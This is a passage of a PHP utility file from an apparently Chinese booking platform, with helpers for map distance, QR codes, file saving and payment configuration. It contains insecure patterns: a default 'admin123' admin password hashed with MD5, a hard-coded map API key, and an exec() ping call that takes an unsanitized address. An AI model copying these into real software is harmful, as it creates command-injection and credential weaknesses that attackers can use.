        $radLng1 = $longitude1 * $PI / 180.0;
        $radLng2 = $longitude2 * $PI /180.0;

        $a = $radLat1 - $radLat2;
        $b = $radLng1 - $radLng2;

        $distance = 2 * asin(sqrt(pow(sin($a/2),2) + cos($radLat1) * cos($radLat2) * pow(sin($b/2),2)));
        $distance = $distance * $EARTH_RADIUS * 1000;

//    if($unit==2){
//        $distance = $distance / 1000;
//    }

        return $distance;

    }
}



if(!function_exists('checkPass')){

    function checkPass ($pass){

        return md5('shequ'.$pass);

    }


}


if(!function_exists('initLogin')){

    function initLogin ($uniacid = 666){

        $admin_model = new \app\massage\model\Admin();

        $admin = $admin_model->dataInfo(['uniacid'=>$uniacid]);

        if(empty($admin)){

            $insert = [

                'uniacid' => $uniacid,

                'username'=> 'admin',

                'passwd'  => checkPass('admin123'),

                'create_time' => time()
            ];

            $admin_model->dataAdd($insert);

        }

        return true;

    }


}

if(!function_exists('setUserForToken')){

    function setUserForToken($token ,$user,$uniacid='7777') {

        \longbingcore\permissions\DiyAuthConfig::getSAuConfig(666);

        $tag = $_SERVER['HTTP_HOST'].$user['id'];

        return setCache("Token_" . $token ,$user ,86400,$uniacid,$tag);
    }
}



if(!function_exists('is_time_cross')){

    /**
     * PHP计算两个时间段是否有交集（边界重叠不算）
     *
     * @param string $beginTime1 开始时间1
     * @param string $endTime1 结束时间1
     * @param string $beginTime2 开始时间2
     * @param string $endTime2 结束时间2
     * @return bool
     */
    function is_time_cross($beginTime1 = '', $endTime1 = '', $beginTime2 = '', $endTime2 = '') {

        $status = $beginTime2 - $beginTime1;

        if ($status > 0) {

            $status2 = $beginTime2 - $endTime1;

            if ($status2 >= 0) {

                return true;

            } else {

                return false;
            }
        } else {

            $status2 = $endTime2 - $beginTime1;

            if ($status2 > 0) {

                return false;

            } else {

                return true;
            }

        }

    }
}


if(!function_exists('is_time_crossV2')){

    /**
     * PHP计算两个时间段是否有交集
     *
     * @param string $beginTime1 开始时间1
     * @param string $endTime1 结束时间1
     * @param string $beginTime2 开始时间2
     * @param string $endTime2 结束时间2
     * @return bool
     */
    function is_time_crossV2($beginTime1 = '', $endTime1 = '', $beginTime2 = '', $endTime2 = '') {

        $status = $beginTime2 - $beginTime1;

        if ($status > 0) {

            $status2 = $beginTime2 - $endTime1;

            if ($status2 > 0) {

                return true;

            } else {

                return false;
            }
        } else {

            $status2 = $endTime2 - $beginTime1;

            if ($status2 >= 0) {

                return false;

            } else {

                return true;
            }

        }

    }
}

if(!function_exists('distance_text')){

    /**
     * PHP计算两个时间段是否有交集（边界重叠不算）
     *
     * @param string $beginTime1 开始时间1
     * @param string $endTime1 结束时间1
     * @param string $beginTime2 开始时间2
     * @param string $endTime2 结束时间2
     * @return bool
     */
    function distance_text($distance,$type=1) {

        if($distance>1000){

            $distance = round($distance/1000,2);

            $text = $distance.'km';
        }else{

            $text = round($distance,1).'m';
        }

        return $text;
    }
}


if(!function_exists('getCode')){

    function getCode($uniacid,$data,$type=1,$page='pages/home'){

        if($type==1){

            $model = new WxSetting($uniacid);

            $data = $model->phpQrCode($data);

        }else{
            //小程序码
            $data = longbingCreateWxCode($uniacid,$data,$page,1);

            $data = transImagesOne($data ,['qr_path'] ,$uniacid);

            $data = $data['qr_path'];

        }

        return $data;

    }

}

if(!function_exists('base64ToPng')){
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2021-07-07 15:22
     * @功能说明:base64转图片
     */
    function base64ToPng($v){

        if(!empty($v)){

            $path = MATER_UPLOAD_PATH.date('Y-m-d',time()).'/img';

            if (!file_exists($path)){

                mkdir ($path,0777,true);
            }

            if (strpos($v, 'https://') !== false) {

                $file_arr[] = $v;

            } else {

                if (strstr($v,",")){

                    $v = explode(',',$v);

                    $v = $v[1];
                }

                $imageName = "/25220_".date("His",time())."_".rand(1111,9999).'.jpg';

                file_put_contents($path.$imageName, base64_decode($v));

                $file = str_replace(FILE_UPLOAD_PATH,HTTPS_PATH,$path.$imageName);

            }

            return $file;

        }

        return [];

    }

}


if(!function_exists('base64ToPngClouds')){
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2021-07-07 15:22
     * @功能说明:base64转图片
     */
    function base64ToPngClouds($v,$uniacid,$host){

        $host = 'https://'.$_SERVER['HTTP_HOST'];

        if(!empty($v)){

            $base_path = 'image/' . $uniacid . '/' . date('y') . '/' . date('m');

            $path = FILE_UPLOAD_PATH.$base_path;

            if (!file_exists($path)){

                mkdir ($path,0777,true);
            }

            preg_match('/^(data:\s*image\/(\w+);base64,)/', $v, $res);

            if (strstr($v,",")){

                $v = explode(',',$v);

                $v = $v[1];
            }

            if(empty($res)){

                return false;
            }

            $imageName = "/25220_".date("His",time())."_".rand(1111,9999).'.'.$res[2];

            file_put_contents($path.$imageName, base64_decode($v));

            $uploda_model = new \app\Common\Upload($uniacid);

            $data = $uploda_model->uploadFile($base_path.$imageName,2);

            if(empty($data['status'])||$data['status']!=1){

                return false;
            }

            $info = $uploda_model->fileInfo($base_path.$imageName ,$imageName ,1);

            $config = longbingGetOssConfig($uniacid);

            if($data['longbing_driver']=='aliyun'&&!empty($config['aliyun_base_dir'])){

                $info['attachment'] = $config['aliyun_base_dir']. '/' . $info['attachment'];
            }

            $info['attachment_path'] = longbingGetFilePath($info['attachment'] , $host,$uniacid ,$data['longbing_driver']);

            return $info;
        }

        return [];
    }

}


if(!function_exists('getCityNumber')) {

    function getCityNumber($uniacid)
    {

        $a = new PermissionMassage($uniacid,[]);

        $num = $a->getCityNumber();

        return $num;
    }
}

if(!function_exists('getDriveDistanceVV')) {

    /**
     * @param $start_lang
     * @param $start_lat
     * @param $end_lng
     * @param $end_lat
     * @param $uniacid
     * @功能说明:计算两地的驾驶距离
     * @author chenniang(龙兵科技)
     * @DataTime: 2022-10-17 12:01
     */
    function getDriveDistanceVV($start_lang,$start_lat, $end_lng,$end_lat,$uniacid)
    {

        $dis = [

            'uniacid' => $uniacid
        ];

        $start = "$start_lat,$start_lang";

        $end   = "$end_lat,$end_lng";

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $key = !empty($config['map_secret'])?$config['map_secret']:'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';; //腾讯地图开发自己申请

        $mode = 'driving'; //driving(驾车)、walking(步行)

        $from = $start; //例如：39.14122,117.14428

        $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428

        $url = 'https://apis.map.qq.com/ws/distance/v1/matrix/?mode='.$mode.'&from='.$from.'&to='.$to.'&key='.$key;

        $info = file_get_contents($url);
        //如果请求失败用直线距离
        if(empty($info)){

            return getDistances($start_lang,$start_lat, $end_lng,$end_lat);
        }

        $info = json_decode($info, true);

        if(isset($info['status'])&&$info['status']==0&&isset($info['result']['rows'][0]['elements'][0]['distance'])){

            return $info['result']['rows'][0]['elements'][0]['distance'];

        }

        return getDistances($start_lang,$start_lat, $end_lng,$end_lat);

    }
}


if(!function_exists('getDriveDistance')) {

    /**
     * @param $start_lang
     * @param $start_lat
     * @param $end_lng
     * @param $end_lat
     * @param $uniacid
     * @功能说明:计算两地的驾驶距离
     * @author chenniang(龙兵科技)
     * @DataTime: 2022-10-17 12:01
     */
    function getDriveDistance($start_lang,$start_lat, $end_lng,$end_lat,$uniacid)
    {

        $dis = [

            'uniacid' => $uniacid
        ];

        $start = "$start_lat,$start_lang";

        $end   = "$end_lat,$end_lng";

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $key = $config['map_secret']; //腾讯地图开发自己申请

        $mode = 'driving'; //driving(驾车)、walking(步行)

        $from = $start; //例如：39.14122,117.14428

        $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428

      //  $url = 'https://apis.map.qq.com/ws/distance/v1/matrix/?mode='.$mode.'&from='.$from.'&to='.$to.'&key='.$key;

        $url = "https://apis.map.qq.com/ws/direction/v1/driving/?from=$from&to=$to&output=json&key=$key";

        $info = file_get_contents($url);

        //如果请求失败用直线距离
        if(empty($info)){

            return getDistances($start_lang,$start_lat, $end_lng,$end_lat);
        }

        $info = json_decode($info, true);

        if(isset($info['status'])&&$info['status']==0&&isset($info['result']['routes'][0]['distance'])){

            return $info['result']['routes'][0]['distance'];
        }

        return getDistances($start_lang,$start_lat, $end_lng,$end_lat);

    }
}


if(!function_exists('getTrajectory')) {

    /**
     * @param $start_lang
     * @param $start_lat
     * @param $end_lng
     * @param $end_lat
     * @param $uniacid
     * @功能说明:获取轨迹
     * @author chenniang(龙兵科技)
     * @DataTime: 2022-10-17 12:01
     */
    function getTrajectory($start_lang,$start_lat, $end_lng,$end_lat,$uniacid)
    {

        $dis = [

            'uniacid' => $uniacid
        ];

        $start = "$start_lat,$start_lang";

        $end   = "$end_lat,$end_lng";

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $key = !empty($config['map_secret'])?$config['map_secret']:'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';; //腾讯地图开发自己申请

        $from = $start; //例如：39.14122,117.14428

        $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428

        $url = 'https://apis.map.qq.com/ws/direction/v1/driving/?from='.$from.'&to='.$to.'&key='.$key;

        $info = file_get_contents($url);
        //如果请求失败用直线距离
        if(empty($info)){

            return [];
        }

        $info = json_decode($info, true);

        if(isset($info['status'])&&$info['status']==0&&isset($info['result']['routes'][0]['polyline'])){

            return $info['result']['routes'][0]['polyline'];

        }

        return [];
    }
}
if (!function_exists('getDriving')) {
    function getDriving($start_lang, $start_lat, $end_lng, $end_lat, $uniacid)
    {

        $dis = [

            'uniacid' => $uniacid
        ];

        $start = "$start_lat,$start_lang";

        $end = "$end_lat,$end_lng";

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $key = !empty($config['map_secret']) ? $config['map_secret'] : 'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';; //腾讯地图开发自己申请

        $from = $start; //例如：39.14122,117.14428

        $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428

        $url = 'https://apis.map.qq.com/ws/direction/v1/driving?from=' . $from . '&to=' . $to . '&output=json&callback=cb&key=' . $key;

        $info = file_get_contents($url);
        //如果请求失败用直线距离
        if (empty($info)) {

            return [];
        }

        $info = json_decode($info, true);

        if (isset($info['status']) && $info['status'] == 0) {

            return $info;
        }

        return [];
    }

}
if(!function_exists('getFxStatus')) {

    function getFxStatus($uniacid){

        $distribution_model = new \app\massage\model\DistributionList();

        $auth = $distribution_model->getPayResellerAuth($uniacid);

        if($auth==true){

            return 1;
        }

        $config = longbingGetAppConfig($uniacid);

        return $config['fx_check'];
    }
}


if(!function_exists('getDriveDistanceV2')) {

    /**
     * @param $start_lang
     * @param $start_lat
     * @param $end_lng
     * @param $end_lat
     * @param $uniacid
     * @功能说明:计算两地的驾驶距离
     * @author chenniang(龙兵科技)
     * @DataTime: 2022-10-17 12:01
     */
    function getDriveDistanceV2($start_lang,$start_lat, $end_lng,$end_lat,$uniacid)
    {

        $dis = [

            'uniacid' => $uniacid
        ];

        $start = "$start_lat,$start_lang";

        $end   = "$end_lat,$end_lng";

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $key = !empty($config['map_secret'])?$config['map_secret']:'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';; //腾讯地图开发自己申请

        $mode = 'driving'; //driving(驾车)、walking(步行)

        $from = $start; //例如：39.14122,117.14428

        $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428

        $url = 'https://apis.map.qq.com/ws/distance/v1/?mode='.$mode.'&from='.$from.'&to='.$to.'&key='.$key;

        $info = file_get_contents($url);
        //如果请求失败用直线距离
        if(empty($info)){

            return getDistances($start_lang,$start_lat, $end_lng,$end_lat);
        }

        $info = json_decode($info, true);

        if(isset($info['status'])&&$info['status']==0&&isset($info['result']['elements'][0]['distance'])){

            return $info['result']['elements'][0]['distance'];

        }

        return getDistances($start_lang,$start_lat, $end_lng,$end_lat);

    }
}

if(!function_exists('object_array')) {

    function object_array($array)
    {
        if (is_object($array)) {
            $array = (array)$array;
        }
        if (is_array($array)) {
            foreach ($array as $key => $value) {
                $array[$key] = object_array($value);
            }
        }
        return $array;
    }
}

if(!function_exists('getIP')) {

    function getIP(){
        global $ip;
        if (getenv("HTTP_CLIENT_IP"))
            $ip = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ip = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("REMOTE_ADDR"))
            $ip = getenv("REMOTE_ADDR");
        else $ip = "Unknow";
        return $ip;
    }
}


if(!function_exists('getFriendNum')) {

    /**
     * @param $num
     * @功能说明:友好数量显示
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-01-29 14:59
     */
    function getFriendNum($num){
        //只有超过10000才显示
        if($num>=10000){

            $num = round($num/10000,1).'万';
        }

        return $num;

    }
}


if(!function_exists('defaultCoachAvatar')) {
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-03-08 14:44
     * @功能说明:默认技师头像
     */
    function defaultCoachAvatar(){

        return 'https://' . $_SERVER['HTTP_HOST'] . '/admin/anmo/technician/default_technician.png';

    }
}


if(!function_exists('getConfigSetting')) {
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-03-08 14:44
     * @功能说明:默认技师头像
     */
    function getConfigSetting($uniacid,$key){

        $config_model = new \app\massage\model\ConfigSetting();

        $config = $config_model->dataInfo($uniacid,[$key]);

        return $config[$key];

    }
}

if(!function_exists('getConfigSettingArr')) {
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-03-08 14:44
     * @功能说明:默认技师头像
     */
    function getConfigSettingArr($uniacid,$key){

        $config_model = new \app\massage\model\ConfigSetting();

        $config = $config_model->dataInfo($uniacid,$key);

        return $config;

    }
}


if(!function_exists('numberEncryption')) {
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-03-08 14:44
     * @功能说明:默认技师头像
     */
    function numberEncryption($uniacid){

        $key = 'numberEncryptionnumberEncryption';

        $value = getCache($key,$uniacid);

        if(is_numeric($value)){

            return $value;
        }
        //开启了号码加密
        if(getConfigSetting($uniacid,'number_encryption')==1){

            $ip = getConfigSetting($uniacid,'number_encryption_ip');

            $ip = !empty($ip)?explode(',',$ip):[];

            if(!in_array(getIP(),$ip)){

                setCache($key,1,99999999,$uniacid);

                return 1;
            }

        }
        setCache($key,0,99999999,$uniacid);

        return 0;
    }
}


if(!function_exists('force_login')) {
    /**
     * @author chenniang(龙兵科技)
     * @DataTime: 2023-03-08 14:44
     * @功能说明:默认技师头像
     */
    function force_login($uniacid){

        $key = 'numberEncryptionnumberforce_login';

        $value = getCache($key,$uniacid);

        if(!empty($value)){

            return $value;
        }

        $value = getConfigSetting($uniacid,'force_login');

        setCache($key,$value,5,$uniacid);

        return $value;
    }
}


//生成微信小程序二维码
function longbingCreateWxCode($uniacid ,$data ,$page = '' ,$type = 3)
{
    $code_id = md5($uniacid . json_encode($data ,true));
    //上传路径
    $path = 'image/' . $uniacid . '/' . 'wxcode';

    if(!mkdirs_v2(FILE_UPLOAD_PATH . $path)) return false;
    //设置文件权限
//  longbingchmodr(FILE_UPLOAD_PATH);
    //封装数据
    if(!isset($data['data'])) $data['data'] = $data;
    $code_data = array(
        'uniacid' => $uniacid,
        'data'    => json_encode($data['data'] ,true)
    );
    //写入数据
    $wechat_code_model = new LongbingCardWechatCode();

    //判断数据是否存在
    $code = longbingGetWxCode($code_id ,$uniacid);
    //创建
    if(empty($code))
    {
        $code_data['id'] = $code_id;
        $result = $wechat_code_model->createCode($code_data);
    }else{
        $result = $wechat_code_model->updateCode(['id' => $code_id] ,$code_data);
    }


    //刷新缓存
    longbingGetWxCode($code_id ,$uniacid ,true);
    if(empty($result)) return false;
    $path = null;
    $with = 430;
    $auto_color = true;
    $line_color = '{"r":0,"g":0,"b":0}';
    $is_hyaline = false;
    //获取数据
    if(isset($data['path'])) $path = $data['path'];
    if(isset($data['with'])) $with = $data['with'];
    if(isset($data['auto_color'])) $auto_color = $data['auto_color'];
    if(isset($data['line_color'])) $line_color = $data['line_color'];
    if(isset($data['is_hyaline'])) $is_hyaline = $data['is_hyaline'];
    //生成获取微信code接口
    $wechat_code_model = new WeChatCode($uniacid);
    switch($type)
    {
        case 1:
            $result = $wechat_code_model->getQRCode($path ,$width = 430);
            break;
        case 2:
            $result = $wechat_code_model->getWxCode($path ,$width = 430 ,$auto_color = true ,$line_color = '{"r":0,"g":0,"b":0}' ,$is_hyaline    = false);
            break;
        default:
            $result = $wechat_code_model->getUnlimitedCode($code_id ,$page ,$width = 430 ,$auto_color = false ,$line_color = '{"r":0,"g":0,"b":0}' ,$is_hyaline    = true);
            break;
    }
    //判断是否生成失败
    $data = json_decode($result ,true);
    if(isset($data['errcode']) || isset($data['errmsg'])) return false;
    //存储文件
    $path = 'image/' . $uniacid . '/' . 'wxcode';
    $file_name = $code_id . '.jpeg';
    $path = $path . '/' . $file_name;
    if(longbingHasLocalFile($path)) unlink(FILE_UPLOAD_PATH . $path);
    $data = file_put_contents(FILE_UPLOAD_PATH . $path ,$result);
    //设置文件权限


    //上传到云端
//  $file = new UploadedFile($path ,$file_name);
//  $file_upload_model = new Upload($uniacid);
//  $result = $file_upload_model->upload('picture' ,$file);
    //删除文件
//  unlink($path);
    // if(empty($data)) return false;

    $data = ['qr_path' => $path ,'path' => $path];

    if($type==3){

        $qr = transImagesOne($data ,['qr_path'] ,$uniacid);

        return $qr;
    }
    //数据转换
    return $data;

}


//获取微信小程序二维码数据
function longbingGetWxCode($code_id ,$uniacid , $is_update = false)
{
    //生成key
    $key = 'longbing_wechat_code_' . $code_id;
    $data = null;
    //获取缓存数据
//    if(hasCache($key ,$uniacid) && empty($is_update))
//    {
//        $data = getCache($key ,$uniacid);
//        if(!empty($data)) return $data;
//    }
    //从数据库中获取数据
    $wechat_code_model = new LongbingCardWechatCode();
    $data = $wechat_code_model->getCode(['id' => $code_id ,'uniacid' => $uniacid]);
    if(!empty($data)) {
        if(isset($data['data'])) $data['data'] = json_decode($data['data'],true);

    }
    return $data;
}


function curlDownFile($file_url, $save_path = '', $file_name = '') {


    // 没有远程url或已下载文件，返回false
    if (trim($file_url) == '' || file_exists( $save_path.$file_name )) {
        return false;
    }

    // 若没指定目录，则默认当前目录
    if (trim($save_path) == '') {
        $save_path = './';
    }


    // 若指定的目录没有，则创建
    if (!file_exists($save_path) && !mkdir($save_path, 0777, true)) {
        return false;
    }

    // 若没指定文件名，则自动命名
    if (trim($file_name) == '') {
        $file_ext = strrchr($file_url, '.');
        $file_exts = array('.gif', '.jpg', '.png','mp3');
        if (!in_array($file_ext, $file_exts)) {
            return false;
        }
        $file_name = time() . $file_ext;
    }

    // curl下载文件
    $ch = curl_init();
    $timeout = 5;
    curl_setopt($ch, CURLOPT_URL, $file_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $file = curl_exec($ch);
    curl_close($ch);

    //dump($file)
    //dump($file)

    // 保存文件到指定路径
    file_put_contents($save_path.$file_name, $file);

    // 释放文件内存
    unset($file);

    // 执行成功，返回true
    return true;
}

if(!function_exists('pingHttp')) {
    function pingHttp($address, $times = 4)
    {
        $status = -1;

        if (strcasecmp(PHP_OS, 'WINNT') === 0) {

// Windows 服务器下

            $pingresult = exec("ping -n 1 {$address}", $outcome, $status);

        } elseif (strcasecmp(PHP_OS, 'Linux') === 0) {

// Linux 服务器下

            $pingresult = exec("ping -c 1 {$address}", $outcome, $status);

        }

        if (0 == $status) {

            $status = true;

        } else {

            $status = false;

        }

        return $status;
    }
}


if(!function_exists('getCityByLat')) {

    function getCityByLat($lng, $lat,$uniacid){

        $dis = [

            'uniacid' => $uniacid
        ];

        $config_model = new Config();

        $config = $config_model->dataInfo($dis);

        $map_secret = !empty($config['map_secret'])?$config['map_secret']:'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';

        $URL  = "https://apis.map.qq.com/ws/geocoder/v1/?location=$lat,$lng&key=$map_secret";

        $data =  longbingCurl($URL,[]);

        $data =  @json_decode($data,true);

        $arr['province'] = !empty($data['result']['address_component']['province'])?$data['result']['address_component']['province']:'';
        $arr['city']     = !empty($data['result']['address_component']['city'])?$data['result']['address_component']['city']:'';
        $arr['area']     = !empty($data['result']['address_component']['district'])?$data['result']['address_component']['district']:'';

        return $arr;
    }
}


if(!function_exists('getMapInfo')) {

    function getMapInfo($lng, $lat,$uniacid,$coach_id=0){

        $location = $lat.','.$lng;

        $key  = $location.'getMapInfoaa'.$coach_id;

        $info = getCache($key,$uniacid);

        if(empty($info)){

            $config_model = new Config();

            $coach_model  = new \app\massage\model\Coach();

            $config = $config_model->getCacheInfo($uniacid);

            $url  = 'https://apis.map.qq.com/ws/geocoder/v1/?location=';

            $url  = $url.$location.'&key='.$config['map_secret'];

            $data = longbingCurl($url,[]);

            $data_arr = json_decode($data,true);

            if(isset($data_arr['status'])&&$data_arr['status']==0){

                $recommend = !empty($data_arr['result']['formatted_addresses']['recommend'])?$data_arr['result']['formatted_addresses']['recommend']:'';

                $standard_address = !empty($data_arr['result']['formatted_addresses']['standard_address'])?$data_arr['result']['formatted_addresses']['standard_address']:'';

                $info = $standard_address.' '.$recommend;

                if(!empty($coach_id)){

                    $coach_model->dataUpdate(['id'=>$coach_id],['address'=>$info]);
                }

                setCache($key,$info,5,$uniacid);

            }else{

                $info = '';
            }
        }

        return $info;
    }
}


if(!function_exists('getCoachAddress')) {

    function getCoachAddress($lng, $lat,$uniacid,$coach_id){

        return getMapInfo($lng, $lat,$uniacid,$coach_id);
    }
}


if(!function_exists('getAddressByIp')) {

    function getAddressByIp($uniacid){

        $config_model = new Config();

        $config = $config_model->getCacheInfo($uniacid);

        $map_key = $config['map_secret'];

        $ip = getIP();

        $url = 'https://apis.map.qq.com/ws/location/v1/ip?ip='.$ip.'&key='.$map_key;

        $a  = file_get_contents($url);

        $json = json_decode($a, true);

        if(isset($json['status'])&&isset($json['message'])&&$json['status']==0){
            //"ip" => "222.211.236.168"
            //    "location" => array:2 [
            //      "lat" => 30.57447
            //      "lng" => 103.92377
            //    ]
            //    "ad_info" => array:6 [
            //      "nation" => "中国"
            //      "province" => "四川省"
            //      "city" => "成都市"
            //      "district" => "双流区"
            //      "adcode" => 510116
            //      "nation_code" => 156
            //    ]
            return $a;
        }else{

            return '{"status":1,"result":{}}';
        }
    }
}

if(!function_exists('payConfig')) {

     function payConfig($uniacid = '666', $app_pay = 2){

        $pay_model    = new \app\massage\model\PayConfig();

        $config_model = new Config();

        $pay    = $pay_model->dataInfo(['uniacid' => $uniacid]);

        $config = $config_model->dataInfo(['uniacid' => $uniacid]);

        $setting['payment'] = [
            'merchant_id'         => $pay['mch_id'],
            'key'                 => $pay['pay_key'],
            'cert_path'           => $pay['cert_path'],
            'key_path'            => $pay['key_path'],
            'ali_appid'           => $pay['ali_appid'],
            'ali_privatekey'      => $pay['ali_privatekey'],
            'ali_publickey'       => $pay['ali_publickey'],
            'appCretPublicKey'    => $pay['appCretPublicKey'],
            'alipayCretPublicKey' => $pay['alipayCretPublicKey'],
            'alipayRootCret'      => $pay['alipayRootCret'],
            'alipay_type'         => $pay['alipay_type'],
        ];

        $setting['company_pay'] = $config['company_pay'];

        if ($app_pay == 0) {

            $setting['app_id'] = $config['appid'];

            $setting['secret'] = $config['appsecret'];

        } elseif ($app_pay == 1) {

            $setting['app_id'] = $config['app_app_id'];

            $setting['secret'] = $config['app_app_secret'];

        } else {

            $setting['app_id'] = $config['web_app_id'];

            $setting['secret'] = $config['web_app_secret'];
        }

        $setting['is_app'] = $app_pay;

        return $setting;
    }

}


if(!function_exists('getPromotionRoleAuth')) {


    function getPromotionRoleAuth($type,$uniacid){

        $auth = \longbingcore\permissions\AdminMenu::getAuthList((int)$uniacid,['salesman','coachbroker','channel','reseller']);

        switch ($type){

            case 1:

                $s_auth = 'reseller';

                $p_auth = 'reseller_status';

                break;
            case 2:

                $s_auth = 'channel';

                $p_auth = 'channel_status';

                break;
            case 3:

                $s_auth = 'coachbroker';

                $p_auth = 'broker_status';

                break;
            case 4:

                $s_auth = 'salesman';

                $p_auth = 'salesman_status';

                break;
        }
        $s_auth = $auth[$s_auth];

        if($s_auth!=true){

            return 0;
        }

        $p_auth = getConfigSetting($uniacid,$p_auth);

        return $p_auth;

    }
}


/**
 * 获取年龄
 */
if (!function_exists('getAge')) {
    function getAge($birthday)
    {
        if (empty($birthday)) {
            return '';
        }
        //格式化出生时间年月日
        $byear = date('Y', $birthday);
        $bmonth = date('m', $birthday);
        $bday = date('d', $birthday);

        //格式化当前时间年月日
        $tyear = date('Y');
        $tmonth = date('m');
        $tday = date('d');

        //开始计算年龄
        $age = $tyear - $byear;
        if ($bmonth > $tmonth || $bmonth == $tmonth && $bday > $tday) {
            $age--;
        }
        return $age;
    }
}

/**
 * 封装php打印函数
 **/
if (!function_exists('pr')) {
    function pr($var = '', $exit = true)
    {
        echo '<pre>';
        print_r($var);
        echo '</pre>';
        if ($exit) {
            die ();
        }
    }
}


if (!function_exists('memberDiscountAuth')) {

    /**
     * @param int $uniacid
     * @功能说明:获取会员折扣权限配置
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function memberDiscountAuth($uniacid = 666)
    {
        $permission = new \app\memberdiscount\info\PermissionMemberdiscount((int)$uniacid);

        $auth = $permission->pAuth();

        if($auth==true){

            $config_model = new \app\memberdiscount\model\Config();

            $data = $config_model->dataInfo(['uniacid'=>$uniacid]);
        }else{

            $data = [

                'status' => 0
            ];
        }

        return $data;
    }
}


if (!function_exists('balanceDiscountAuth')) {

    /**
     * @param int $uniacid
     * @功能说明:获取会员折扣权限配置
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function balanceDiscountAuth($uniacid = 666,$type=1)
    {
        $permission = new \app\balancediscount\info\PermissionBalancediscount((int)$uniacid);

        $auth =  $p_auth = $permission->pAuth();

        if($auth==true){

            $auth = getConfigSetting($uniacid,'balance_discount_status');
        }

        if($type==2){

            return [

                'auth' => $p_auth,

                'status' => $auth
            ];

        }else{

            return $auth;
        }
    }
}



if (!function_exists('giveMemberPrice')) {

    /**
     * @param int $uniacid
     * @功能说明:获取会员折扣权限配置
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function giveMemberPrice($uniacid,$list)
    {
        $member_auth = memberDiscountAuth($uniacid);

        if($member_auth['status']==0){

            return $list;
        }

        foreach ($list as $k=>$value){

            $list[$k]['member_price'] = round($value['price']*$member_auth['discount']/10,2);
        }

        return $list;
    }
}


if (!function_exists('timeHour')) {

    /**
     * @param int $uniacid
     * @功能说明:时间取小时
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function timeHour($time)
    {

        $hour = floor($time/60);

        $minute = $time-$hour*60;

        return [

            'hour' => $hour,

            'minute' => $minute,
        ];

      //  return $hour.'小时'.$minute.'分钟';
    }
}


if (!function_exists('getUserBalance')) {

    /**
     * @param int $uniacid
     * @功能说明:获取用户余额
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function getUserBalance($user_id,$uniacid){

        $user_model = new \app\massage\model\User();

        $cash = $user_model->where(['id'=>$user_id])->sum('balance');

        $permission = new \app\balancediscount\info\PermissionBalancediscount((int)$uniacid);

        $balance_auth = $permission->pAuth();

        if($balance_auth==true){

            $card_user_model = new UserCard();

            $card_balance = $card_user_model->where(['user_id'=>$user_id,'status'=>1])->where('over_time','>',time())->sum('cash');

            $cash+= $card_balance;
        }

        return round($cash,2);
    }
}
if (!function_exists('getUserBalanceTwo')) {
    /**
     * @param int $uniacid
     * @功能说明:获取用户余额
     * @author chenniang
     * @DataTime: 2024-09-05 10:59
     */
    function getUserBalanceTwo($user_id, $uniacid)
    {

        $user_model = new \app\massage\model\User();

        $cash = $user_model->where(['id' => $user_id])->sum('balance');

        $card_balance = 0;

        $permission = new \app\balancediscount\info\PermissionBalancediscount((int)$uniacid);

        $balance_auth = $permission->pAuth();

        if ($balance_auth == true) {

            $card_user_model = new UserCard();

            $card_balance = $card_user_model->where(['user_id' => $user_id, 'status' => 1])->where('over_time', '>', time())->sum('cash');
        }

        return [round($cash, 2), round($card_balance, 2)];
    }
}

if (!function_exists('base64ToPdf')) {
    /**
     * @Desc: base64转pdf
     * @param $base64
     * @return string
     * @Auther: shurong(龙兵科技)
     * @Time: 2024/10/21 18:19
     */
    function base64ToPdf($base64, $file_path = 'contract')
    {
        $dir = \think\facade\App::getRootPath();

        $path = $dir . 'public/' . $file_path . '/';

        $pdfContent = base64_decode($base64);

        // 指定PDF文件名
        $pdfFileName = time() . rand(10000, 99999) . '.pdf';

        if (!is_dir($path)) {

            mkdir($path, 0777, true);
        }

        $fp = fopen($path . $pdfFileName, "a");
        flock($fp, LOCK_EX);
        fwrite($fp, $pdfContent);
        flock($fp, LOCK_UN);
        fclose($fp);

        return 'https://' . $_SERVER['SERVER_NAME'] . '/' . $file_path . '/' . $pdfFileName;
    }
}

if (!function_exists('lbData')) {

    function lbData($function,$token,$develop=1,$data=[]){

        $goods_name   = config('app.AdminModelList')['app_model_name'];

        $auth_uniacid = config('app.AdminModelList')['auth_uniacid'];

        $upgrade      = new LongbingUpgrade($auth_uniacid , $goods_name , false);

        $data = $upgrade->lbData($function,$token,$develop,$data);

        return $data;
    }
}

if (!function_exists('nearTimeText')) {

    function nearTimeText($time){

        $now_str = strtotime(date('Y-m-d'));

        if($time<$now_str+86400-1){

            $text = '今日';

        }elseif ($time<$now_str+86400*2-1){

            $text = '明日';
        }else{

            $text = changeWeek(date('w',$time));
        }

